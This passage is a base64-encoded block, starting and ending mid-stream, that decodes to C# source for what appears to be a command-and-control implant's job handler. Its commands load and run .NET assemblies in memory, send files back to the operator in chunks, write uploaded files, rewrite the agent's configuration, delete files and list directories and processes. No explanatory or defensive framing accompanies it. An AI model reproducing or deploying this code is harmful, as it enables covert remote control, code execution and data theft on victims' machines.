IHRocmVhZCA9IG5ldyBUaHJlYWQoKCkgPT4gRXhlY3V0ZVRhc2tpbmcoSm9iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZC5TdGFydCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuam9iX3N0YXJ0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IudGhyZWFkID0gdGhyZWFkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5jb21tYW5kID09ICJ1cGxvYWQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtzLkNvdW50ID09IDApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhyZWFkIHRocmVhZCA9IG5ldyBUaHJlYWQoKCkgPT4gRXhlY3V0ZVRhc2tpbmcoSm9iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZC5TdGFydCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IudGhyZWFkID0gdGhyZWFkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5kb3dubG9hZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmZpbGVfaWQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghU3lzdGVtLklPLkZpbGUuRXhpc3RzKEpvYi5wYXJhbWV0ZXJzKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkVycm9yIGZpbGUgZG9lcyBub3QgZXhpc3RzIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi50b3RhbF9jaHVua3MgPSAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnBhdGggPSBNb2R1bGVzLkRvd25sb2FkLkdldFBhdGgoSm9iLnBhcmFtZXRlcnMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnRvdGFsX2NodW5rcyA9IChpbnQpTW9kdWxlcy5Eb3dubG9hZC5HZXRUb3RhbENodW5rcyhKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuZmlsZV9zaXplID0gTW9kdWxlcy5Eb3dubG9hZC5HZXRGaWxlU2l6ZShKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChKb2IuY2h1bmtzLkNvdW50ID4gMSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeGVjdXRlVGFza2luZyhKb2IpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaHJlYWQgdGhyZWFkID0gbmV3IFRocmVhZCgoKSA9PiBFeGVjdXRlVGFza2luZyhKb2IpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aHJlYWQuU3RhcnQoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuam9iX3N0YXJ0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi50aHJlYWQgPSB0aHJlYWQ7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBFeGVjdXRlVGFza2luZyhKb2IgSm9iKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzd2l0Y2ggKEpvYi5jb21tYW5kLlRvTG93ZXIoKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImxvYWRhc3NlbWJseSI6DQogICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gYXNzZW1ibHkgPSBNb2R1bGVzLkdldEFzc2VtYmx5KEpvYi5jaHVua3MsIEpvYi50b3RhbF9jaHVua3MpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE1vZHVsZXMuTG9hZChKb2IuZmlsZV9pZCwgQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhhc3NlbWJseSkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJhc3NlbWJseSBzdWNjZXNzZnVsbHkgbG9hZGVkIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gImFzc2VtYmx5IGNvdWxkIG5vdCBiZSBsb2FkZWQiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAicnVuYXNzZW1ibHkiOg0KICAgICAgICAgICAgICAgICAgICAgICAgUnVuQXNzZW1ibHkgcnVuQXNzZW1ibHkgPSBSdW5Bc3NlbWJseS5Gcm9tSnNvbihKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIU1vZHVsZXMuQ2hlY2socnVuQXNzZW1ibHkuYXNzZW1ibHlfaWQpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJhc3NlbWJseSBub3QgbG9hZGVkIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nW10gYXJncyA9IG5ldyBzdHJpbmdbXSB7IH07DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocnVuQXNzZW1ibHkuYXJncy5MZW5ndGggPj0gMikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcmdzID0gcnVuQXNzZW1ibHkuYXJncy5TcGxpdCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFyZ3MgPSBuZXcgc3RyaW5nW10geyBydW5Bc3NlbWJseS5hcmdzIH07DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgcmVzcG9uc2UgPSBNb2R1bGVzLkludm9rZShydW5Bc3NlbWJseS5hc3NlbWJseV9pZCwgYXJncyk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2UuTGVuZ3RoIDwgQ29uZmlnLkNodW5rU2l6ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSByZXNwb25zZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IudG90YWxfY2h1bmtzID0gKHJlc3BvbnNlLkxlbmd0aCArIENvbmZpZy5DaHVua1NpemUgLSAxKSAvIENvbmZpZy5DaHVua1NpemU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGNvdW50ID0gMDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoY291bnQgIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCArIDEgPT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IHNpemUgPSByZXNwb25zZS5MZW5ndGggLSAoY291bnQgKiBDb25maWcuQ2h1bmtTaXplKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuQWRkKHJlc3BvbnNlLlN1YnN0cmluZygoY291bnQgKiBDb25maWcuQ2h1bmtTaXplKSwgY291bnQpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvdW50Kys7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY2h1bmtzLkFkZChyZXNwb25zZS5TdWJzdHJpbmcoKGNvdW50ICogQ29uZmlnLkNodW5rU2l6ZSksIENvbmZpZy5DaHVua1NpemUpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvdW50Kys7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IucmVzcG9uc2UgIT0gIlxyXG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImxpc3Rsb2FkZWQiOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFDb25maWcuTW9kdWxlcy5BbnkoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAibm8gYXNzZW1ibGllcyBsb2FkZWQiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgQXNzZW1ibGllcyA9IE1vZHVsZXMuTGlzdEFzc2VtYmxpZXMoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9IEFzc2VtYmxpZXM7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJkb3dubG9hZCI6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rX251bSAhPSBKb2IudG90YWxfY2h1bmtzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBjaHVuayA9IE1vZHVsZXMuRG93bmxvYWQuR2V0Q2h1bmsoSm9iLnBhcmFtZXRlcnMsIEpvYi5jaHVua19udW0sIEpvYi50b3RhbF9jaHVua3MsIEpvYi5maWxlX3NpemUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuQWRkKGNodW5rKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY2h1bmtfbnVtKys7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAidXBsb2FkIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2Iud3JpdGVfbnVtID09IDApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFN5c3RlbS5JTy5GaWxlLkV4aXN0cyhKb2IucGF0aCkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiRXJyb3IgZmlsZSBhbHJlYWR5IGV4aXN0cyI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtzLkNvdW50ICE9IDApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoTW9kdWxlcy5VcGxvYWQoSm9iLnBhdGgsIEpvYi5jaHVua3NbMF0pKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLndyaXRlX251bSsrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY2h1bmtzLlJlbW92ZShKb2IuY2h1bmtzWzBdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLndyaXRlX251bSA9PSBKb2IudG90YWxfY2h1bmtzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJGaWxlIHN1Y2Nlc3NmdWxseSB1cGxvYWRlZCI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImNvbmZpZyI6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnBhcmFtZXRlcnMuVG9Mb3dlcigpID09ICJpbmZvIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSBNb2R1bGVzLkdldENvbmZpZygpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYoTW9kdWxlcy5TZXRDb25maWcoSm9iLnBhcmFtZXRlcnMuVG9Mb3dlcigpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiQ29uZmlndXJhdGlvbiBzdWNjZXNzZnVsbHkgdXBkYXRlZCI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJFcnJvciBjb3VsZCBub3QgdXBkYXRlIGNvbmZpZyI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJleGl0IjoNCiAgICAgICAgICAgICAgICAgICAgICAgIEVudmlyb25tZW50LkV4aXQoMSk7DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAiam9icyI6DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAiam9ia2lsbCI6DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAicHdkIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9IERpcmVjdG9yeS5HZXRDdXJyZW50RGlyZWN0b3J5KCk7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJjZCI6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoRGlyZWN0b3J5LkV4aXN0cyhKb2IucGFyYW1ldGVycykpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlyZWN0b3J5LlNldEN1cnJlbnREaXJlY3RvcnkoSm9iLnBhcmFtZXRlcnMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJOZXcgY3VycmVudCBkaXJlY3Rvcnk6ICIgKyBEaXJlY3RvcnkuR2V0Q3VycmVudERpcmVjdG9yeSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiQ291bGQgbm90IGZpbmQgZGlyZWN0b3J5IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgInJtIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChGaWxlLkV4aXN0cyhKb2IucGFyYW1ldGVycykpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5EZWxldGUoSm9iLnBhcmFtZXRlcnMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChGaWxlLkV4aXN0cyhKb2IucGFyYW1ldGVycykpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiQ291bGQgbm90IGRlbGV0ZSBmaWxlIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJTdWNjZXNzZnVsbHkgZGVsZXRlZCBmaWxlIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkZpbGUgZG9lcyBub3QgZXhpc3RzIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImxzIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IucGFyYW1ldGVycyA9PSAiIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucGFyYW1ldGVycyA9ICIuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChEaXJlY3RvcnkuRXhpc3RzKEpvYi5wYXJhbWV0ZXJzKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXJlY3RvcnlMaXN0IGRpcmVjdG9yeUxpc3QgPSBNb2R1bGVzLkRpcmVjdG9yeUxpc3RpbmcoSm9iLnBhcmFtZXRlcnMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9IERpcmVjdG9yeUxpc3QuVG9Kc29uKGRpcmVjdG9yeUxpc3QpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEZpbGUuRXhpc3RzKEpvYi5wYXJhbWV0ZXJzKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXJlY3RvcnlMaXN0IGRpcmVjdG9yeUxpc3QgPSBNb2R1bGVzLkRpcmVjdG9yeUxpc3RpbmcoSm9iLnBhcmFtZXRlcnMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9IERpcmVjdG9yeUxpc3QuVG9Kc29uKGRpcmVjdG9yeUxpc3QpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiQ2Fubm90IGZpbmQgZGlyZWN0b3J5IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgInBzIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc3NMaXN0IHByb2Nlc3NMaXN0ID0gTW9kdWxlcy5Qcm9jZXNzTGlzdC5HZXRQcm9jZXNzTGlzdCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gUHJvY2Vzc0xpc3QuVG9Kc29uKHByb2Nlc3NMaXN0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiQ29tbWFuZCBub3QgaW1wbGVtZW50ZWQiOw0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgI